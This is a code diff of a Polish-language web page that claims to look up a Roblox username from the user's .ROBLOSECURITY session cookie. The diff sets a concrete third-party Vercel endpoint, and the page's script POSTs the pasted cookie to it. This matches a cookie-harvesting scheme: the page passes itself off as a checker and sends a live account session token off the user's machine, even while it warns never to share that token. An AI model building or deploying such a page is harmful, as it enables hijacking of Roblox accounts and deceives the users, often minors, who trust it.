@@ -17,7 +17,7 @@
 <body>
 
 <h2>Pobierz nazwę użytkownika Roblox z cookie</h2>
-<p style="color:#ffcc00;"><strong>OSTRZEŻENIE:</strong> wwwww!</p>
+<p style="color:#ffcc00;"><strong>OSTRZEŻENIE:</strong> .ROBLOSECURITY to klucz do konta – NIGDY nie wysyłaj go nikomu!</p>
 
 <textarea id="cookie" placeholder="Wklej tutaj sam ciąg .ROBLOSECURITY (bez '.ROBLOSECURITY=')"></textarea>
 
@@ -40,7 +40,7 @@ async function sprawdz() {
   result.innerHTML = '<i>Proszę czekać...</i>';
 
   try {
-    const resp = await fetch('https://twoja-nazwa-projektu.vercel.app/api/get-username', {  // ZMIEŃ NA SWÓJ PRAWdziWY URL Z VERCEL !!!
+    const resp = await fetch('https://checker-alpha-pink.vercel.app/api/get-username', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ cookie: cookieVal })
